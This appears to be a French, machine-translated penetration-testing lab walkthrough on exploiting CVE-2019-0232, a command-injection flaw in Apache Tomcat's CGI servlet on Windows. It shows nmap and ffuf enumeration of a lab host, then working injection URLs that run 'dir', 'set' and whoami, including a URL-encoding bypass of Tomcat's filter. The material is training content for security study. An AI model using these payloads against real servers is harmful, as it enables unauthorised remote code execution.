Attaquer Tomcat CGI
====================

* * * * *

`CVE-2019-0232` est un problème de sécurité critique qui peut entraîner l'exécution de code à distance. Cette vulnérabilité affecte les systèmes Windows sur lesquels la fonctionnalité `enableCmdLineArguments` est activée. Un attaquant peut exploiter cette vulnérabilité en exploitant une faille d'injection de commande résultant d'une erreur de validation d'entrée de Tomcat CGI Servlet, lui permettant ainsi d'exécuter des commandes arbitraires sur le système affecté. Les versions `9.0.0.M1` à `9.0.17`, `8.5.0` à `8.5.39` et `7.0.0` à `7.0.93` de Tomcat sont concernées.

Le servlet CGI est un composant essentiel d'Apache Tomcat qui permet aux serveurs Web de communiquer avec des applications externes au-delà de la JVM Tomcat. Ces applications externes sont généralement des scripts CGI écrits dans des langages tels que Perl, Python ou Bash. Le servlet CGI reçoit les requêtes des navigateurs Web et les transmet aux scripts CGI pour traitement.

Essentiellement, un servlet CGI est un programme qui s'exécute sur un serveur Web, tel qu'Apache2, pour prendre en charge l'exécution d'applications externes conformes à la spécification CGI. Il s'agit d'un intergiciel entre les serveurs Web et les ressources d'information externes comme les bases de données.

Les scripts CGI sont utilisés dans les sites Web pour plusieurs raisons, mais leur utilisation présente également de gros inconvénients :

| Avantages | Inconvénients |
| --- | --- |
| Il est simple et efficace pour générer du contenu Web dynamique. | Entraîne une surcharge en devant charger des programmes en mémoire pour chaque requête. |
| Utilisez n'importe quel langage de programmation capable de lire à partir de l'entrée standard et d'écrire sur la sortie standard. | Impossible de mettre facilement en cache les données en mémoire entre les requêtes de page. |
| Peut réutiliser le code existant et éviter d'écrire du nouveau code. | Cela réduit les performances du serveur et consomme beaucoup de temps de traitement. |

Le paramètre `enableCmdLineArguments` du servlet CGI d'Apache Tomcat contrôle si les arguments de ligne de commande sont créés à partir de la chaîne de requête. Si la valeur est true, le servlet CGI analyse la chaîne de requête et la transmet au script CGI en tant qu'arguments. Cette fonctionnalité peut rendre les scripts CGI plus flexibles et plus faciles à écrire en permettant de transmettre des paramètres au script sans utiliser de variables d'environnement ou d'entrée standard. Par exemple, un script CGI peut utiliser des arguments de ligne de commande pour basculer entre les actions en fonction de l'entrée de l'utilisateur.

Supposons que vous disposiez d'un script CGI permettant aux utilisateurs de rechercher des livres dans le catalogue d'une librairie. Le script a deux actions possibles : "recherche par titre" et "recherche par auteur".

Le script CGI peut utiliser des arguments de ligne de commande pour basculer entre ces actions. Par exemple, le script peut être appelé avec l'URL suivante :

Code : http

```
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby

```

Ici, le paramètre `action` est défini sur `title`, ce qui indique que le script doit rechercher par titre de livre. Le paramètre `query` spécifie le terme de recherche "Gatsby le magnifique".

Si l'utilisateur souhaite effectuer une recherche par auteur, il peut utiliser une URL similaire :

Code : http

```
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald

```

Ici, le paramètre `action` est défini sur `author`, ce qui indique que le script doit effectuer une recherche par nom d'auteur. Le paramètre `query` spécifie le terme de recherche "fitzgerald".

En utilisant des arguments de ligne de commande, le script CGI peut facilement basculer entre différentes actions de recherche en fonction de l'entrée de l'utilisateur. Cela rend le script plus flexible et plus facile à utiliser.

Cependant, un problème survient lorsque `enableCmdLineArguments` est activé sur les systèmes Windows, car le servlet CGI ne parvient pas à valider correctement l'entrée du navigateur Web avant de la transmettre au script CGI. Cela peut conduire à une attaque par injection de commande du système d'exploitation, qui permet à un attaquant d'exécuter des commandes arbitraires sur le système cible en les injectant dans une autre commande.

Par exemple, un attaquant peut ajouter `dir` à une commande valide en utilisant `&` comme séparateur pour exécuter `dir` sur un système Windows. Si l'attaquant contrôle l'entrée d'un script CGI qui utilise cette commande, il peut injecter ses propres commandes après `&` pour exécuter n'importe quelle commande sur le serveur. Par exemple, `http://example.com/cgi-bin/hello.bat?&dir`, qui transmet `&dir` comme argument à `hello.bat` et exécute `dir` sur le serveur. Par conséquent, un attaquant peut exploiter l'erreur de validation des entrées du servlet CGI pour exécuter n'importe quelle commande sur le serveur.

* * * * *

Énumération
-----------

Analysez la cible à l'aide de `nmap`, cela aidera à identifier les services actifs fonctionnant actuellement sur le système. Ce processus fournira des informations précieuses sur la cible, en découvrant quels services et potentiellement quelles versions spécifiques sont en cours d'exécution, permettant une meilleure compréhension de son infrastructure et des vulnérabilités potentielles.

#### Nmap - Ports ouverts

Nmap - Ports ouverts

```
dsgsec@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open

Démarrage de Nmap 7.93 ( https://nmap.org ) au 2023-03-23 13:57 SAST
Rapport d'analyse Nmap pour 10.129.204.227
L'hôte est actif (latence de 0,17 s).
Non illustré : 63648 ports TCP fermés (connexion refusée), 1873ports tcp filtrés (pas de réponse)
Certains ports fermés peuvent être signalés comme filtrés en raison de --defeat-rst-ratelimit
SERVICE DE L'ÉTAT DU PORT
22/tcp ouvrir ssh
| ssh-hostkey :
| 2048ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
| 256 382e76cd0594a6e717d1808165262544 (ECDSA)
|_ 256 35096912230f11bc546fddf797bd6150 (ED25519)
135/tcp ouvert msrpc
139/tcp ouvert netbios-ssn
445/tcp ouvrir microsoft-ds
5985/tcp open wsman
8009/tcp ouvert ajp13
| méthodes ajp :
|_ Méthodes prises en charge : GET HEAD POST OPTIONS
8080/tcp open http-proxy
|_http-titre : Apache Tomcat/9.0.17
|_http-favicon : Apache Tomcat
47001/tcp open winrm

Résultats du script hôte :
| temps smb2 :
| date: 2023-03-23T11:58:42
|_ date_début : N/A
| mode-sécurité-smb2 :
| 311 :
|_ Signature des messages activée mais non requise

Nmap terminé : 1 adresse IP (1 hôte actif) scannée en 165,25 secondes

```

Ici, nous pouvons voir que Nmap a identifié `Apache Tomcat/9.0.17` s'exécutant sur le port `8080` en cours d'exécution.

#### Recherche d'un script CGI

L'un des moyens de découvrir le contenu du serveur Web consiste à utiliser l'outil d'énumération Web `ffuf` avec la liste de mots `dirb common.txt` . Sachant que le répertoire par défaut pour les scripts CGI est `/cgi`, soit par connaissance préalable, soit en recherchant la vulnérabilité, nous pouvons utiliser l'URL `http://10.129.204.227:8080/cgi/FUZZ.cmd` ou `http : //10.129.204.227:8080/cgi/FUZZ.bat` pour effectuer le fuzzing.

#### Extensions de fuzz - .CMD

Extensions de fuzz - .CMD

```
dsgsec@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd

         /'___\ /'___\ /'___\
        /\ \__/ /\ \__/ __ __ /\ \__/
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
          \ \_\ \ \_\ \ \____/ \ \_\
           \/_/ \/_/ \/___/ \/_/

        v2.0.0-dev
________________________________________________

  :: Méthode : GET
  :: URL : http://10.129.204.227:8080/cgi/FUZZ.cmd
  :: Liste de mots : FUZZ: /usr/share/dirb/wordlists/common.txt
  :: Suivre les redirections : false
  :: Calibrage : faux
  :: Délai d'attente : 10
  :: Fils : 40
  :: Matcher : état de la réponse : 200 204 301 302 307 401 403 405 500
________________________________________________

:: Progression : [4614/4614] :: Travail [1/1] :: 223 req/sec :: Durée : [0:00:20] :: Erreurs : 0 ::

```

Puisque le système d'exploitation est Windows, nous visons à fuzz pour les scripts batch. Bien que le fuzzing pour les scripts avec une extension .cmd échoue, nous avons réussi à découvrir le fichier welcome.bat en fuzzant pour les fichiers avec une extension .bat.

#### Extensions de fuzz - .BAT

Extensions de fuzz - .BAT

```
dsgsec@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

         /'___\ /'___\ /'___\
        /\ \__/ /\ \__/ __ __ /\ \__/
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
          \ \_\ \ \_\ \ \____/ \ \_\
           \/_/ \/_/ \/___/ \/_/

        v2.0.0-dev
________________________________________________

  :: Méthode : GET
  :: URL : http://10.129.204.227:8080/cgi/FUZZ.bat
  :: Liste de mots : FUZZ: /usr/share/dirb/wordlists/common.txt
  :: Suivre les redirections : false
  :: Calibrage : faux
  :: Délai d'attente : 10
  :: Fils : 40
  :: Matcher : état de la réponse : 200 204 301 302 307 401 403 405 500
________________________________________________

[Statut : 200, Taille : 81, Mots : 14, Lignes : 2, Durée : 234 ms]
     * FUZZ : bienvenue

:: Progression : [4614/4614] :: Travail [1/1] :: 226 req/sec :: Durée : [0:00:20] :: Erreurs : 0 ::

```

La navigation vers l'URL découverte à `http://10.129.204.227:8080/cgi/welcome.bat` renvoie un message :

Code : txt

```
Bienvenue sur CGI, cette section n'est pas encore fonctionnelle. Veuillez retourner à la page d'accueil.

```

* * * * *

Exploitation
------------

Comme indiqué ci-dessus, nous pouvons exploiter `CVE-2019-0232` en ajoutant nos propres commandes à l'aide du séparateur de commandes par lots `&`. Nous avons maintenant un chemin de script CGI valide découvert lors de l'énumération à `http://10.129.204.227:8080/cgi/welcome.bat`

Code : http

```
http://10.129.204.227:8080/cgi/welcome.bat?&dir

```

La navigation vers l'URL ci-dessus renvoie la sortie de la commande `dir` batch, mais essayer d'exécuter d'autres applications de ligne de commande Windows courantes, telles que `whoami` ne renvoie pas de sortie.

Récupérez une liste de variables d'environnement en appelant la commande `set` :

Code : http

```
# http://10.129.204.227:8080/cgi/welcome.bat?&set

Bienvenue sur CGI, cette section n'est pas encore fonctionnelle. Veuillez retourner à la page d'accueil.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, dégonfler
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11 ; Linux x86_64 ; rv:102.0) Gecko/20100101 Firefox/102.0
CHEMINEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
INVITE=$P$G
QUERY_STRING=&définir
REMOTE_ADDR=10.10.14.58
REMOTE_HOST=10.10.14.58
REMOTE_IDENT=
REMOTE_USER=
REQUEST_METHOD=OBTENIR
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat

```

Dans la liste, nous pouvons voir que la variable `PATH` a été désactivée, nous devrons donc coder en dur les chemins dans les requêtes :

Code : http

```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe

```

La tentative a échoué et Tomcat a répondu avec un message d'erreur indiquant qu'un caractère non valide avait été rencontré. Apache Tomcat a introduit un correctif qui utilise une expression régulière pour empêcher l'utilisation de caractères spéciaux. Cependant, le filtre peut être contourné en encodant l'URL de la charge utile.

Code : http

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

```